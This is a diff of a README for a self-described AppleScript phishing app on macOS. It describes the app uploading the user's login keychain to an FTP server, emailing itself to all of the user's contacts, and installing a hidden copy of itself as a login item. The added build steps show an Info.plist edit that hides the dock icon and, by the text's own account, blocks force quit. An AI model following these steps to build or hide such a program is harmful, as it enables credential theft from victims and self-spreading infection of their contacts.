@@ -14,17 +14,21 @@ This is a phishing app that I wrote. It is written in applescript, which is impo
 *  It uploads this file to an FTP server
 *  It copies the user's login keychain into the same folder and uploads it to the same FTP server
 *  It sends an email to all of the user's contacts' emails with the app attached.
-*  It installs isightcapture
 
 The script is saved as an application with a duplicate application inside of it. It copies the inner application to the hidden folder and sets it as a login item.
 
  **Please feel free to test the script by doing the following:**
 
-1. Save Testing.applescript as an application
-2. Save Updater testing.applescript as an application named "Updater.app"
-3. Copy Updater.app to the resources folder of the first application
-4. (optional) [download isightcapture](http://www.macupdate.com/app/mac/18598/isightcapture) and stick it in there, too
+1. Save App.applescript as an application (example name "App.app")
+2. Add the following 2 lines of code to the "info.plist" file in "App.app/Contents/" folder
+
+		<key>NSUIElement</key>
+        <string>1</string>
+(this prevents a dock icon from appearing and also makes it impossible to force quit the app)
+3. Save Updater testing.applescript as an application named "Updater.app"
+3. Repeat step 2 for "Updater.app"
+3. Copy Updater.app to the resources folder "App.app"
 
 The resources folder of the main app should look something like this:
 
-![image](http://f.cl.ly/items/3l1X2q3l1I3p3Q0j2D39/Resources.png)
+![image](http://f.cl.ly/items/2e1H2C3p1L401D1a3944/Screen%20Shot%202012-12-18%20at%207.55.22%20PM.png)
